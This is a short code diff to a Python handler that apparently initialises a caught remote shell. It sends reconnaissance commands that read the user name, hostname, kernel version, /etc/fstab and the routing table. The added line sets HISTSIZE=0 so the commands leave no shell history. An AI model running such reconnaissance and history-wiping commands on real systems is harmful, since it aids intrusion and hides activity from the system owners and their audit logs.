@@ -75,6 +75,7 @@ async def handle_shell_init(reader, writer):
     randomStringHostnamePrefix = randomString()
     randomStringHostnameSuffix = randomString()
     init_command = str()
+    init_command = "export HISTSIZE=0;"
     init_command += f"echo {randomStringWhoamiPrefix} && whoami && echo {randomStringWhoamiSuffix}\n"
     init_command += f"echo {randomStringHostnamePrefix} && cat /etc/hostname && echo {randomStringHostnameSuffix}\n"
     init_command += f"echo {randomStringPrefix} && whoami && cat /proc/version /etc/fstab /proc/net/route && echo {randomStringSuffix}\n"
